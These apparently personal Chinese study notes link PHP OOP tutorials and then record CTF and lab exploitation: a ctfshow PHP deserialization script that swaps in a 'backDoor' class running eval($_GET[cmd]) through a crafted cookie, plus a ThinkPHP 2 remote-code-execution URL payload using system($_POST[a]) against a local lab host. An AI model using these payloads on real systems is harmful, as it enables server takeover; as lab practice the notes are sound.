...
php教程https://www.runoob.com/php/php-oop.html
...
![img](https://raw.githubusercontent.com/20231201/123/main/animals.png)
...
![img](https://raw.githubusercontent.com/20231201/123/main/1462335800-8110-classes-and-objects.jpg)
...
[运行实例 »](https://www.runoob.com/try/runcode.php?filename=oop_demo1&type=php)
...
[运行实例 »](https://www.runoob.com/try/runcode.php?filename=oop_demo2&type=php)
...
class ctfShowUser{
    ...
    public function __construct(){
        $this->class=new backDoor();//修改为backdoor方法
    }
...
class backDoor{
    private $code='eval($_GET[cmd]);';//修改为cmd
    public function getInfo(){
        eval($this->code);
    }
}
$user=new ctfShowUser();
echo urlencode(serialize($user));//复制显示的内容并粘贴至例题cookie新建user的value处
?>
//在例题处给username和password赋值并执行cmd的命令
```

php2 think ice：https://blog.csdn.net/m0_37638874/article/details/126749104

搭建环境![搭建环境](https://raw.githubusercontent.com/20231201/123/main/image-20240221193658260.png)

```txt
http://192.168.85.129:8080/index.php?s=/a/b/c/${@print(system($_POST[a]))}
```

![运行结果](https://raw.githubusercontent.com/20231201/123/main/image-20240221193608849.png)